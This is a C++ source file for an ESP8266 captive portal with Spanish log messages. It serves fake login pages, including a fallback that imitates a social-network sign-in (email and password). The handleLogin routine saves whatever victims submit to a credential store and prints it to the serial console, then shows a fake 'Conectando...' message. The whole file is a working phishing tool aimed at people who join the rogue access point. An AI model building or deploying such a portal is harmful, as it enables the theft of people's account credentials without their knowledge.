#include "captive_portal.h"
#include "config.h"
#include <LittleFS.h>

extern bool portalActive;
extern int currentTemplate;

CaptivePortal::CaptivePortal(CredentialStore& store)
    : store(store) {
    active = false;
    currentTemplate = 0;
    server = nullptr;
}

void CaptivePortal::begin(ESP8266WebServer& srv) {
    server = &srv;
    server->on("/", HTTP_GET, [this]() { handleRoot(); });
    server->on("/login", HTTP_POST, [this]() { handleLogin(); });
    server->on("/template", HTTP_POST, [this]() {
        int idx = server->arg("template").toInt();
        setTemplate(idx);
        server->send(200, "text/plain", "OK");
    });
}

void CaptivePortal::setActive(bool state) {
    active = state;
    portalActive = state;
    Serial.println(active ? "[PORTAL] Activado" : "[PORTAL] Desactivado");
}

bool CaptivePortal::isActive() {
    return active;
}

void CaptivePortal::setTemplate(int index) {
    if (index >= 0 && index < TEMPLATE_COUNT) {
        currentTemplate = index;
        Serial.printf("[PORTAL] Template: %s\n", TEMPLATE_NAMES[index]);
    }
}

int CaptivePortal::getCurrentTemplate() {
    return currentTemplate;
}

void CaptivePortal::handleRoot() {
    if (!active) {
        server->send(404, "text/plain", "Portal no activo");
        return;
    }
    
    String html = loadTemplate(currentTemplate);
    server->send(200, "text/html", html);
}

void CaptivePortal::handleLogin() {
    if (!active) {
        server->send(404, "text/plain", "Portal no activo");
        return;
    }
    
    String field1 = server->arg("field1");
    String field2 = server->arg("field2");
    
    if (field1.length() > 0) {
        store.addCredential(TEMPLATE_NAMES[currentTemplate], field1, field2);
        Serial.printf("[PORTAL] Credencial: %s / %s\n", field1.c_str(), field2.c_str());
    }
    
    String thanks = "<html><head><meta charset='UTF-8'><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f2f5;}.msg{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;}h2{color:#1877f2;margin-bottom:10px;}p{color:#65676b;}</style></head><body><div class='msg'><h2>Conectando...</h2><p>Por favor espera un momento.</p></div></body></html>";
    server->send(200, "text/html", thanks);
}

String CaptivePortal::loadTemplate(int index) {
    if (index < 0 || index >= TEMPLATE_COUNT) index = 0;
    
    String filename = String("/templates/") + TEMPLATES[index];
    
    if (LittleFS.exists(filename)) {
        File file = LittleFS.open(filename, "r");
        String content = file.readString();
        file.close();
        return content;
    }
    
    return "<html><head><meta charset='UTF-8'><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f2f5;}.card{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:100%;max-width:400px;}h2{color:#1877f2;text-align:center;margin-bottom:20px;}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px;}button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:10px;}</style></head><body><div class='card'><h2>Iniciar Sesi&oacute;n</h2><form action='/login' method='POST'><input type='text' name='field1' placeholder='Email' required><input type='password' name='field2' placeholder='Contrase&ntilde;a' required><button type='submit'>Continuar</button></form></div></body></html>";
}
